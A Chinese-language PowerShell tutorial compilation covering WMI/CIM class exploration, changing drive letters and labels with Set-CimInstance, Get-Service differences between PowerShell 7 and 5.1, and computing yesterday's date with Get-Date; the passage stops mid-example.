<p>WMI拥有一个类和类事件(class occurrences)的层次数据库，呈树形结构。这些类描述了计算机中的硬件和软件。这个数据库被组织成命名空间，每个命名空间包含类和可选的附加命名空间。您可以使用CIM cmdlet来检索和更新此信息。命名空间的根是root，在它的下面还有十几个命名空间，最常用的是root\cimv2。命名空间的信息存储在静态类__Namespace类中，要查询当前命名空间下的所有命名空间，可以查看__Namespace类的实例。使用PowerShell查询命名空间：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> __namespace <span class="literal">-Namespace</span> root | <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure>

<p>例如，您可以从<code>**Win32_Volume**</code>类中发现驱动器的驱动器号和驱动器标签。该类位于<code>rootCimV2</code>名称空间中。</p>
<p>许多WMI类还包含可作用于WMI对象的方法。可以使用<code>**Win32_Volume**</code>类的<code>Format()</code>方法格式化Windows卷。</p>
<p>要获取WMI类的属性值，或者调用类方法，可以使用WMI cmdlet，它随Windows PowerShell V1附带。但是，这些cmdlet不再随PowerShell 7一起发布。当然，一个坚定的IT专业人士可以找到解决这个问题的方法，但你不必这么做。</p>
<p>在PowerShell 7中，您可以使用CIM cmdlet来访问这些信息。CIM cmdlet首先与Windows PowerShell V3一起发布，并代表了IT专业人员访问WMI的重大改革。更新的cmdlet与WMI cmdlet完成相同的工作，但是具有不同的cmdlet，以及不同的工作方式，正如您在本文中看到的那样。</p>
<h3 id="探索WMI类属性"><a href="#探索WMI类属性" class="headerlink" title="探索WMI类属性"></a>探索WMI类属性</h3><p>使用cmdlet <code>Get-CimClass</code>来发现任何给定类的属性的名称(和类型)。您可以像这样发现<code>**Win32_Volume**</code>类的属性。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimClass</span> <span class="literal">-ClassName</span> Win32_Volume |</span><br><span class="line">  <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> CimClassProperties |</span><br><span class="line">    <span class="built_in">Sort-Object</span> <span class="literal">-Property</span> Name |</span><br><span class="line">      <span class="built_in">Format-Table</span> Name, CimType, Qualifiers</span><br></pre></td></tr></table></figure>

<p>该命令的输出如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Name                             CimType Qualifiers</span><br><span class="line">----                             ------- ----------</span><br><span class="line">Access                            UInt16 &#123;read&#125;</span><br><span class="line">Automount                        Boolean &#123;read&#125;</span><br><span class="line">Availability                      UInt16 &#123;MappingStrings, read, ValueMap&#125;</span><br><span class="line">BlockSize                         UInt64 &#123;MappingStrings, read&#125;</span><br><span class="line">BootVolume                       Boolean &#123;read&#125;</span><br><span class="line">Capacity                          UInt64 &#123;read&#125;</span><br><span class="line">Caption                           String &#123;MaxLen, read&#125;</span><br><span class="line">Compressed                       Boolean &#123;read&#125;</span><br><span class="line">ConfigManagerErrorCode            UInt32 &#123;read, Schema, ValueMap&#125;</span><br><span class="line">ConfigManagerUserConfig          Boolean &#123;read, Schema&#125;</span><br><span class="line">CreationClassName                 String &#123;CIM_Key, read&#125;</span><br><span class="line">Description                       String &#123;read&#125;</span><br><span class="line">DeviceID                          String &#123;CIM_Key, read, key, MappingStrings, Override&#125;</span><br><span class="line">DirtyBitSet                      Boolean &#123;read&#125;</span><br><span class="line">DriveLetter                       String &#123;read, <span class="built_in">write</span>&#125;</span><br><span class="line">DriveType                         UInt32 &#123;MappingStrings, read&#125;</span><br><span class="line">ErrorCleared                     Boolean &#123;read&#125;</span><br><span class="line">ErrorDescription                  String &#123;read&#125;</span><br><span class="line">ErrorMethodology                  String &#123;read&#125;</span><br><span class="line">FileSystem                        String &#123;read&#125;</span><br><span class="line">FreeSpace                         UInt64 &#123;read&#125;</span><br><span class="line">IndexingEnabled                  Boolean &#123;read, <span class="built_in">write</span>&#125;</span><br><span class="line">InstallDate                     DateTime &#123;MappingStrings, read&#125;</span><br><span class="line">Label                             String &#123;read, <span class="built_in">write</span>&#125;</span><br><span class="line">LastErrorCode                     UInt32 &#123;read&#125;</span><br><span class="line">MaximumFileNameLength             UInt32 &#123;read&#125;</span><br><span class="line">Name                              String &#123;read&#125;</span><br><span class="line">NumberOfBlocks                    UInt64 &#123;MappingStrings&#125;</span><br><span class="line">PageFilePresent                  Boolean &#123;read&#125;</span><br><span class="line">PNPDeviceID                       String &#123;read, Schema&#125;</span><br><span class="line">PowerManagementCapabilities  UInt16Array &#123;read&#125;</span><br><span class="line">PowerManagementSupported         Boolean &#123;read&#125;</span><br><span class="line">Purpose                           String &#123;read&#125;</span><br><span class="line">QuotasEnabled                    Boolean &#123;read&#125;</span><br><span class="line">QuotasIncomplete                 Boolean &#123;read&#125;</span><br><span class="line">QuotasRebuilding                 Boolean &#123;read&#125;</span><br><span class="line">SerialNumber                      UInt32 &#123;read&#125;</span><br><span class="line">Status                            String &#123;MaxLen, read, ValueMap&#125;</span><br><span class="line">StatusInfo                        UInt16 &#123;MappingStrings, read, ValueMap&#125;</span><br><span class="line">SupportsDiskQuotas               Boolean &#123;read&#125;</span><br><span class="line">SupportsFileBasedCompression     Boolean &#123;read&#125;</span><br><span class="line">SystemCreationClassName           String &#123;CIM_Key, Propagated, read&#125;</span><br><span class="line">SystemName                        String &#123;CIM_Key, Propagated, read&#125;</span><br><span class="line">SystemVolume                     Boolean &#123;read&#125;</span><br></pre></td></tr></table></figure>

<p>在这个列表中，您可以看到<code>**Win32_Volume**</code> WMI类的每个属性、属性的数据类型和限定符。限定符告诉您有关属性的更多信息，特别是给定属性是只读还是读写。<code>PageFilePresent</code>属性表示给定卷是否包含Windows分页文件。不能使用CIM cmdlet更改此属性。另一方面，<code>DriveLetter</code>和<code>Label</code>属性是可以更改的。让我们看看如何更改这些属性。</p>
<h3 id="获取WMI属性"><a href="#获取WMI属性" class="headerlink" title="获取WMI属性"></a>获取WMI属性</h3><p>假设要更改磁盘驱动器的卷标签。在我的主机中，M:驱动器包含了数字化音乐的收藏。但有时，当我插入USB备份驱动器执行备份时，Windows会为我更改驱动器号。为了确保我的备份脚本工作，我需要把它改回来，这样我的备份脚本才能正常工作。</p>
<p>驱动器标签和驱动器号的值可以通过该操作获取：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Drive</span> = <span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Volume <span class="literal">-Filter</span> <span class="string">&quot;DriveLetter = &#x27;M:&#x27;&quot;</span></span><br><span class="line"><span class="variable">$Drive</span> | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> SystemName, Label, DriveLetter</span><br></pre></td></tr></table></figure>

<p>在我的Windows 10主机(Cookham24)上，输出如下所示</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$Drive</span> | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> SystemName, DriveLetter, Label, DriveLetter</span><br><span class="line"></span><br><span class="line">SystemName Label		 DriveLetter</span><br><span class="line">---------- ----- 		 -----------</span><br><span class="line">COOKHAM24  Master GD M:         </span><br></pre></td></tr></table></figure>

<h3 id="更换驱动器标签"><a href="#更换驱动器标签" class="headerlink" title="更换驱动器标签"></a>更换驱动器标签</h3><p>我们在上面看到驱动器标签和驱动器号都是可写属性。若要更改此磁盘卷的标签，请为**$Drive**的<code>label</code>属性分配一个新值。更改属性值将更新内存中的类实例，这不是永久更改。为了保持更改，您需要使用<code>Set-CimInstance</code> CMDLET。以下是更改驱动器标签，然后确认更改的方法：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Drive</span> = <span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Volume <span class="literal">-Filter</span> <span class="string">&quot;DriveLetter = &#x27;M:&#x27;&quot;</span></span><br><span class="line"><span class="variable">$Drive</span> | <span class="built_in">Set-CimInstance</span> <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;Label=<span class="string">&#x27;Grateful Dead&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Volume <span class="literal">-Filter</span> <span class="string">&quot;DriveLetter = &#x27;M:&#x27;&quot;</span> |</span><br><span class="line">  <span class="built_in">Select-Object</span> <span class="literal">-Property</span> SystemName, Label, DriveLetter</span><br></pre></td></tr></table></figure>

<p>该命令的输出显示了更新后的系统标签，如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">SystemName Label         DriveLetter</span><br><span class="line">---------- -----         -----------</span><br><span class="line">COOKHAM24  Grateful Dead M:  </span><br></pre></td></tr></table></figure>

<h3 id="更换驱动器号"><a href="#更换驱动器号" class="headerlink" title="更换驱动器号"></a>更换驱动器号</h3><p>要更改卷的驱动器号，可以使用<code>Set-CimInstance</code>更改驱动器号，如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Drive</span> = <span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Volume <span class="literal">-Filter</span> <span class="string">&quot;DriveLetter = &#x27;M:&#x27;&quot;</span></span><br><span class="line"><span class="variable">$Drive</span> | <span class="built_in">Set-CimInstance</span> <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;DriveLetter =<span class="string">&#x27;X:&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>如果您在非管理员会话中运行PowerShell 7，此操作将失败，如下所示</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:Foo&gt; <span class="variable">$Drive</span> = <span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Volume <span class="literal">-Filter</span> <span class="string">&quot;DriveLetter = &#x27;M:&#x27;&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:Foo&gt; <span class="variable">$Drive</span> | <span class="built_in">Set-CimInstance</span> <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;DriveLetter =<span class="string">&#x27;X:&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">Set-CimInstance</span>: Access is denied.</span><br></pre></td></tr></table></figure>

<p>此错误是意料之中的，因为您不是以管理员身份运行PowerShell。要克服此错误，请在提升会话中重新运行该命令(以管理员身份运行)。然后输出是这样的：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:Foo&gt; <span class="variable">$Drive</span> = <span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Volume <span class="literal">-Filter</span> <span class="string">&quot;DriveLetter = &#x27;M:&#x27;&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:Foo&gt; <span class="variable">$Drive</span> | <span class="built_in">Set-CimInstance</span> <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;DriveLetter =<span class="string">&#x27;X:&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">PS</span> C:Foo&gt; <span class="built_in">Get-Volume</span> | <span class="built_in">Where-Object</span> FileSystemLabel <span class="operator">-eq</span> <span class="string">&#x27;Grateful Dead&#x27;</span></span><br><span class="line"></span><br><span class="line">DriveLetter FriendlyName  FileSystemType DriveType HealthStatus OperationalStatus SizeRemaining    Size</span><br><span class="line">----------- ------------  -------------- --------- ------------ ----------------- -------------    ----</span><br><span class="line">X           Grateful Dead NTFS           Fixed     Healthy      OK                <span class="number">591.78</span> GB        <span class="number">3.64</span> TB</span><br></pre></td></tr></table></figure>

<p>更改驱动器号需要一段时间，所以要有耐心。</p>
<p>最后一点，您可以将两个属性更新合并到一个<code>Set-CimInstance</code>调用中。要将该驱动器恢复到旧驱动器号(M:)和它的标签(GD Master)并确认更改，可以这样做：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Drive</span> = <span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Volume <span class="literal">-Filter</span> <span class="string">&quot;DriveLetter = &#x27;X:&#x27;&quot;</span></span><br><span class="line"><span class="variable">$Drive</span> | <span class="built_in">Set-CimInstance</span> <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;DriveLetter = <span class="string">&#x27;M:&#x27;</span>; Label = <span class="string">&#x27;GD Master&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>您可以使用Get-Volume查看驱动器号和标签的更改结果。输出应该如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:Foo&gt; <span class="built_in">Get-Volume</span> | <span class="built_in">Where-Object</span> FileSystemLabel <span class="operator">-match</span> <span class="string">&#x27;GD Master&#x27;</span></span><br><span class="line">DriveLetter FriendlyName FileSystemType DriveType HealthStatus OperationalStatus SizeRemaining    Size</span><br><span class="line">----------- ------------ -------------- --------- ------------ ----------------- -------------    ----</span><br><span class="line">M           GD Master    NTFS           Fixed     Healthy      OK                <span class="number">591.78</span> GB        <span class="number">3.64</span> TB</span><br></pre></td></tr></table></figure>

<p>注意：当您更改驱动器号然后将其还原时，您可能会遇到一个问题，如下所示。Windows似乎保留了旧的驱动器号，不允许您立即将其恢复。因此，当试图恢复驱动器号时，您可能会得到一个<code>Set-CimInstance: not available</code>错误消息。为了解决这个问题，你必须重新启动Windows，只是注销和休眠是不行的。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>使用PowerShell 7更改驱动器号简单而直接。可以看到，使用<code>Set-CimInstance</code> PowerShell cmdlet修改可写WMI属性非常简单。我觉得这比做多个属性值赋值更直观(一旦你掌握了哈希表)。最酷的是可以一次修改多个属性，而不是进行大量赋值。</p>
<p>一如既往，这篇文章表明，实现任何目标的方法往往不止一种。</p>
<h3 id="致敬感谢"><a href="#致敬感谢" class="headerlink" title="致敬感谢"></a>致敬感谢</h3><p>本文的灵感来自于以前的一篇Scripting Guys博客文章:<a href="https://devblogs.microsoft.com/scripting/change-drive-letters-and-labels-via-a-simple-powershell-command/">Change drive letters and labels via a simple PowerShell command</a>。那篇文章是由最优秀的Ed Wilson写的，谢谢Ed！</p>
<h2 id="对比在PowerShell-7和Windows-PowerShell-5-1中使用Get-Service"><a href="#对比在PowerShell-7和Windows-PowerShell-5-1中使用Get-Service" class="headerlink" title="对比在PowerShell 7和Windows PowerShell 5.1中使用Get-Service"></a>对比在PowerShell 7和Windows PowerShell 5.1中使用Get-Service</h2><p>问题：如何获取Windows服务的Username和StartType？</p>
<p>解答：使用Powershell 7。</p>
<p>PowerShell版本信息存储在$psversiontable和$host变量中。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$psversiontable</span></span><br><span class="line"></span><br><span class="line">Name                           Value</span><br><span class="line">----                           -----</span><br><span class="line">PSVersion                      <span class="number">5.1</span>.<span class="number">19041.2364</span></span><br><span class="line">PSEdition                      Desktop</span><br><span class="line">PSCompatibleVersions           &#123;<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>...&#125;</span><br><span class="line">BuildVersion                   <span class="number">10.0</span>.<span class="number">19041.2364</span></span><br><span class="line">CLRVersion                     <span class="number">4.0</span>.<span class="number">30319.42000</span></span><br><span class="line">WSManStackVersion              <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion      <span class="number">2.3</span></span><br><span class="line">SerializationVersion           <span class="number">1.1</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure>

<p>微软在每个版本的PowerShell上都做得很好。这个问题的简单答案是一个名为<code>Get-Service</code>的命令。但是PowerShell 7有一个很大的更新，可以更容易地获取所需的信息。我将使用PowerShell 7和Windows PowerShell 5.1显示此命令的结果。</p>
<p>让我们从键入简单的<code>Get-Service Workstation</code>命令开始。此命令返回名为Workstation的服务的基本详细信息。PowerShell 7和Windows PowerShell 5.1的结果是相同的。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Status   Name               DisplayName</span><br><span class="line">------   ----               -----------</span><br><span class="line">Running  LanmanWorkstation  Workstation</span><br></pre></td></tr></table></figure>

<p>要向下追踪并获得更详细的结果，我们需要查看此服务的所有相关属性和方法，可以使用以下命令实现。</p>
<h3 id="使用Get-Service获取Windows服务属性"><a href="#使用Get-Service获取Windows服务属性" class="headerlink" title="使用Get-Service获取Windows服务属性"></a>使用Get-Service获取Windows服务属性</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Service</span> Workstation | <span class="built_in">Get-Member</span> | <span class="built_in">Select-Object</span> Name, MemberType</span><br></pre></td></tr></table></figure>

<p>输出返回一个可以在命令行中调用的成员列表。下面是PowerShell 7中的输出。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Name                         MemberType</span><br><span class="line">----                         ----------</span><br><span class="line">Name                      AliasProperty</span><br><span class="line">RequiredServices          AliasProperty</span><br><span class="line">Disposed                          Event</span><br><span class="line">Close                            Method</span><br><span class="line"><span class="keyword">Continue</span>                         Method</span><br><span class="line">Dispose                          Method</span><br><span class="line">Equals                           Method</span><br><span class="line">ExecuteCommand                   Method</span><br><span class="line">GetHashCode                      Method</span><br><span class="line">GetLifetimeService               Method</span><br><span class="line">GetType                          Method</span><br><span class="line">InitializeLifetimeService        Method</span><br><span class="line">Pause                            Method</span><br><span class="line">Refresh                          Method</span><br><span class="line"><span class="built_in">Start</span>                            Method</span><br><span class="line">Stop                             Method</span><br><span class="line">WaitForStatus                    Method</span><br><span class="line">BinaryPathName                 Property</span><br><span class="line">CanPauseAndContinue            Property</span><br><span class="line">CanShutdown                    Property</span><br><span class="line">CanStop                        Property</span><br><span class="line">Container                      Property</span><br><span class="line">DelayedAutoStart               Property</span><br><span class="line">DependentServices              Property</span><br><span class="line">Description                    Property</span><br><span class="line">DisplayName                    Property</span><br><span class="line">MachineName                    Property</span><br><span class="line">ServiceHandle                  Property</span><br><span class="line">ServiceName                    Property</span><br><span class="line">ServicesDependedOn             Property</span><br><span class="line">ServiceType                    Property</span><br><span class="line">Site                           Property</span><br><span class="line">StartType                      Property</span><br><span class="line">StartupType                    Property</span><br><span class="line">Status                         Property</span><br><span class="line">UserName                       Property</span><br><span class="line">ToString                   ScriptMethod</span><br></pre></td></tr></table></figure>

<p>下面是Windows PowerShell 5.1中的输出。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Name                         MemberType</span><br><span class="line">----                         ----------</span><br><span class="line">Name                      AliasProperty</span><br><span class="line">RequiredServices          AliasProperty</span><br><span class="line">Disposed                          Event</span><br><span class="line">Close                            Method</span><br><span class="line"><span class="keyword">Continue</span>                         Method</span><br><span class="line">CreateObjRef                     Method</span><br><span class="line">Dispose                          Method</span><br><span class="line">Equals                           Method</span><br><span class="line">ExecuteCommand                   Method</span><br><span class="line">GetHashCode                      Method</span><br><span class="line">GetLifetimeService               Method</span><br><span class="line">GetType                          Method</span><br><span class="line">InitializeLifetimeService        Method</span><br><span class="line">Pause                            Method</span><br><span class="line">Refresh                          Method</span><br><span class="line"><span class="built_in">Start</span>                            Method</span><br><span class="line">Stop                             Method</span><br><span class="line">WaitForStatus                    Method</span><br><span class="line">CanPauseAndContinue            Property</span><br><span class="line">CanShutdown                    Property</span><br><span class="line">CanStop                        Property</span><br><span class="line">Container                      Property</span><br><span class="line">DependentServices              Property</span><br><span class="line">DisplayName                    Property</span><br><span class="line">MachineName                    Property</span><br><span class="line">ServiceHandle                  Property</span><br><span class="line">ServiceName                    Property</span><br><span class="line">ServicesDependedOn             Property</span><br><span class="line">ServiceType                    Property</span><br><span class="line">Site                           Property</span><br><span class="line">StartType                      Property</span><br><span class="line">Status                         Property</span><br><span class="line">ToString                   ScriptMethod</span><br></pre></td></tr></table></figure>

<h3 id="PowerShell-7"><a href="#PowerShell-7" class="headerlink" title="PowerShell 7"></a>PowerShell 7</h3><p>最大的区别在于属性成员。现在，在PowerShell 7中，可以读取一些在Windows PowerShell 5.1中不可用的附加属性，如UserName, BinaryPathName, StartType。因此，让我们看看如何使用PowerShell 7读取这些属性。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> <span class="number">7</span>&gt; <span class="built_in">Get-Service</span> workstation | <span class="built_in">select</span>  Username,Starttype,BinaryPathName</span><br></pre></td></tr></table></figure>

<p>输出是清晰的，使用本机一行命令可以得到所有所需的结果。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">UserName                    StartType BinaryPathName</span><br><span class="line">--------                    --------- --------------</span><br><span class="line">NT AUTHORITY\NetworkService Automatic C:\WINDOWS\System32\svchost.exe <span class="literal">-k</span> NetworkService <span class="literal">-p</span></span><br></pre></td></tr></table></figure>

<h3 id="Windows-Powershell-5-1"><a href="#Windows-Powershell-5-1" class="headerlink" title="Windows Powershell 5.1"></a>Windows Powershell 5.1</h3><p>对于Windows PowerShell 5.1，操作不像PowerShell那样简单。我们需要使用<code>Get-CimInstance</code>并传递所需的WQL查询。因此，在Windows PowerShell 5.1中，运行以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">WPS <span class="number">5.1</span>&gt; <span class="built_in">Get-CimInstance</span> <span class="literal">-Query</span> <span class="string">&#x27;select * from Win32_Service where caption like &quot;Workstation&quot;&#x27;</span> | <span class="built_in">select</span> StartName,StartMode,PathName</span><br></pre></td></tr></table></figure>

<p>返回如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">StartName                   StartMode PathName</span><br><span class="line">---------                   --------- --------</span><br><span class="line">NT AUTHORITY\NetworkService Auto      C:WINDOWS\System32\svchost.exe <span class="literal">-k</span> NetworkService <span class="literal">-p</span></span><br></pre></td></tr></table></figure>

<p>在本例中，我们使用查询调用<code>Get-CimInstance</code>以获取服务名称，然后选择所需的属性，这需要您了解与原始服务名称相关的额外信息和一些基本的WMI查询语言。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>PowerShell 7自带的功能越来越多，使用方便，向后兼容性丰富得多。这篇文章展示了PowerShell中一个小变化的一小部分，它将帮助许多管理员完成日常任务。</p>
<h2 id="获取昨天的日期"><a href="#获取昨天的日期" class="headerlink" title="获取昨天的日期"></a>获取昨天的日期</h2><p>问题：怎么才能获取昨天的日期？</p>
<p>解答：您可以组合使用<code>Get-Date</code> CMDLET和<code>.NET Time/Date</code>方法。</p>
<p>首先，让我们看看PowerShell和.NET中的日期，然后我们可以看看如何计算昨天并在脚本中使用它。</p>
<h3 id="PowerShell中的日期"><a href="#PowerShell中的日期" class="headerlink" title="PowerShell中的日期"></a>PowerShell中的日期</h3><p>让我们从如何处理日期(date)和时间(time)开始。您可能知道，PowerShell包含<code>Get-Date</code> cmdlet。这个cmdlet返回一个<code>.NET **System.DateTime**</code>对象。</p>
<p>使用<code>Get-Date</code> cmdlet，您可以获取任何日期和时间，并将其显示或存储在变量中。为了知道今天的日期。你可以这样做：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:&gt; <span class="comment"># Get the current date</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="built_in">Get-Date</span></span><br><span class="line"><span class="number">08</span> January <span class="number">2021</span> <span class="number">11</span>:<span class="number">24</span>:<span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Store the date in a variable</span></span><br><span class="line"><span class="variable">$Now</span> = <span class="built_in">Get-Date</span></span><br><span class="line"><span class="variable">$Now</span></span><br><span class="line"><span class="number">08</span> January <span class="number">2021</span> <span class="number">11</span>:<span class="number">24</span>:<span class="number">47</span></span><br></pre></td></tr></table></figure>

<p>如前所述，<code>Get-Date</code>cmdlet返回一个类型为<code>System.DateTime</code>的对象。这个 .NET 结构提供了一组丰富的属性和方法来帮助您操作日期/时间对象。 有关此结构的更多详细信息，请参阅 <a href="https://docs.microsoft.com/dotnet/api/system.datetime">System.DateTime 文档</a>。 日期和时间对象包含日期和时间。 这意味着您可以创建一个只有日期或只有时间或两者都有的对象，这为您处理日期和时间提供了巨大的灵活性。</p>
<p>如果您运行<code>Get-Date</code>并且未指定任何参数，该 cmdlet 将返回当前日期和时间。 您可以指定几个参数，以允许您为特定日期创建对象，如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:&gt; <span class="comment"># Using the -Date Parameter and a date string</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="built_in">Get-Date</span> <span class="literal">-Date</span> <span class="string">&#x27;1 August 1942&#x27;</span></span><br><span class="line"><span class="number">01</span> August <span class="number">1942</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Using the -Month, Day, Year to be specific and avoid parsing</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="built_in">Get-Date</span> <span class="literal">-Month</span> <span class="number">8</span> <span class="literal">-Day</span> <span class="number">1</span> <span class="literal">-Year</span> <span class="number">1942</span> <span class="literal">-Hour</span> <span class="number">0</span> <span class="literal">-Minute</span> <span class="number">0</span> <span class="literal">-Second</span> <span class="number">0</span></span><br><span class="line"><span class="number">01</span> August <span class="number">1942</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>您可以查看<code>Get-Date</code>的其他功能以帮助以您需要的确切格式获取日期，请参阅<a href="https://docs.microsoft.com/powershell/module/microsoft.powershell.utility/get-date?view=powershell-7.1"> Get-Date 帮助信息</a>。</p>
<h3 id="获取昨天的日期-1"><a href="#获取昨天的日期-1" class="headerlink" title="获取昨天的日期"></a>获取昨天的日期</h3><p>如您所见，您可以使用 <code>Get-Date</code> 返回特定日期/时间。 那么你如何得到昨天的日期——或者日期、上个月或去年？ 这里的技巧是使用从 <code>Get-Date</code> 返回的对象。 该对象有一个 <code>System.DateTime</code> 类型，它包含许多方法，允许您向对象添加时间增量——一个月、一天等。</p>
<p>要获取昨天（或明天）的日期，您可以使用不带参数的 <code>Get-Date</code> 创建今天的日期和时间对象。 然后使用 <code>AddDays()</code> 方法添加/减去一些天数，如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:&gt; <span class="comment"># Get today&#x27;s Date</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$Today</span>     = <span class="built_in">Get-Date</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$Yesterday</span> = <span class="variable">$Today</span>.AddDays(<span class="literal">-1</span>)</span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$Yesterday</span></span><br><span class="line"><span class="number">19</span> February <span class="number">2021</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">51</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="comment"># Or more simply</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$Yesterday</span> = (<span class="built_in">Get-Date</span>).AddDays(<span class="literal">-1</span>)</span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$Yesterday</span></span><br><span class="line"><span class="number">19</span> February <span class="number">2021</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">52</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="comment"># Get tomorrow&#x27;s date</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$Tomorrow</span>  = (<span class="built_in">Get-Date</span>).AddDays(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$Tomorrow</span></span><br><span class="line"><span class="number">21</span> February <span class="number">2021</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">54</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，<code>System.DateTime</code> 对象是不可变的。 这意味着您不能在创建对象后更改属性值。 如果您使用任何 Add 方法，.NET 将返回一个具有新属性值的新对象。</p>
<h3 id="使用昨天的日期"><a href="#使用昨天的日期" class="headerlink" title="使用昨天的日期"></a>使用昨天的日期</h3><p>获取过去(或将来)的日期有多种用例，包括：</p>
<ul>
<li>识别相比这 一天/一个月/etc. 更旧/更新的文件</li>
<li>确定上周未登录的 AD 用户</li>
<li>为表示上周信息的文件创建文件名。</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:&gt; <span class="comment"># Finding files newer than yesterday</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="variable">$Yesterday</span> = (<span class="built_in">Get-Date</span>).AddDays(<span class="literal">-1</span>)</span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="built_in">Get-ChildItem</span> | <span class="built_in">Where-Object</span> LastAccessTime <span class="operator">-gt</span> <span class="variable">$Yesterday</span></span><br><span class="line"></span><br><span class="line">    Directory: C:</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line"><span class="literal">-a</span>---          <span class="number">20</span>/<span class="number">02</span>/<span class="number">2021</span>    <span class="number">14</span>:<span class="number">20</span>          <span class="number">11041</span> GratefulDead Show List.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="comment"># Getting users who have logged on in the past day</span></span><br><span class="line"><span class="built_in">PS</span> C:&gt; <span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * <span class="literal">-Property</span> LastLogonDate | <span class="built_in">Where-Object</span> LastlogonDate <span class="operator">-gt</span> <span class="variable">$Yesterday</span></span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=Administrator,CN=Users,DC=cookham,DC=net</span><br><span 